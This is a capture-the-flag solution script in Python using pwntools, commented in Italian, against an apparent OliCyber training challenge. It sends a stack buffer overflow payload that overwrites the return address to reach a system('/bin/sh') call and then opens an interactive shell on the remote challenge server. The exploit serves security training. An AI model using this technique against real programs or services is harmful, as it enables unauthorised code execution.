#In questa challenge bisogna eseguire un buffer overflow direttamente dentro l'if della stessa funzione di modo tale da eseguire la funzione system

from pwn import *
#context.binary = ELF('/moreprivateclub')

def main():
    conn = remote('moreprivateclub.challs.olicyber.it', 10016)
    
    conn.recvuntil(b'?\n')   #Quanti hanni hai?
    conn.sendline(b'25')

    conn.recvuntil(b'?\n')
    
    ret_sys = 0x4012CE  

    payload = b'A' * 35  # Padding per il buffer v5 (35 byte)
    payload += b'B' * 12   # Padding per v6 (8 byte, i primi 2 interi)
    payload += b'C' * 8   # RBP
    payload += p64(ret_sys)  # ret to bin/sh
    print(f'payload: {payload}')	

    conn.sendline(payload)
    print(payload.hex())
    
    conn.interactive()
    
if __name__ == "__main__":
    main()
